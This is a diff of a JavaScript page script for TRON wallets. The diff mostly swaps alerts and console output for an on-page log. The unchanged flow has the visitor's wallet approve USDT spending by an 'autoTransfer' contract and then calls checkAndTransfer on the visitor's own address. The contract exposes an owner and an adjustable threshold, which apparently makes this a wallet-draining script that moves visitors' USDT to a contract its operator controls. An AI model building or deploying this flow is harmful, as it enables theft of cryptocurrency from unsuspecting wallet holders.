@@ -38,22 +38,28 @@ const usdtAbi = [
     {"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
     {"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
 ];
-
 const autoTransferAbi = [
     {"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
     {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
     {"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"checkAndTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
     {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-    {"inputs":[    {"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
     {"inputs":[],"name":"threshold","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
     {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
 ];
 
 let tronWeb;
 
+function logMessage(message) {
+    const resultDiv = document.getElementById('result');
+    const messageElement = document.createElement('div');
+    messageElement.innerText = message;
+    resultDiv.appendChild(messageElement);
+}
+
 async function init() {
     if (typeof window.tronWeb === 'undefined') {
-        alert('请安装OKX Wallet并切换到TRON网络!');
+        logMessage('请安装OKX Wallet并切换到TRON网络!');
         return;
     }
 
@@ -61,24 +67,24 @@ async function init() {
 
     try {
         const account = tronWeb.defaultAddress.base58;
-        console.log('Account:', account);
+        logMessage('Account: ' + account);
 
         const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+        logMessage('USDT Contract: ' + usdtContractAddress);
+
         const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
+        logMessage('Auto Transfer Contract: ' + autoTransferContractAddress);
 
-        console.log('USDT Contract:', usdtContract);
-        console.log('Auto Transfer Contract:', autoTransferContract);
-
-        document.getElementById('result').innerText = '开始授权...';
+        logMessage('开始授权...');
         await usdtContract.approve(autoTransferContractAddress, approveAmount).send({ shouldPollResponse: true });
+        logMessage('授权成功');
 
-        document.getElementById('result').innerText = '授权成功，开始转账...';
+        logMessage('开始转账...');
         await autoTransferContract.checkAndTransfer(account).send({ shouldPollResponse: true });
-
-        document.getElementById('result').innerText = '转账成功';
+        logMessage('转账成功');
     } catch (error) {
         console.error('Error:', error);
-        document.getElementById('result').innerText = '操作失败';
+        logMessage('操作失败: ' + error.message);
     }
 }
 
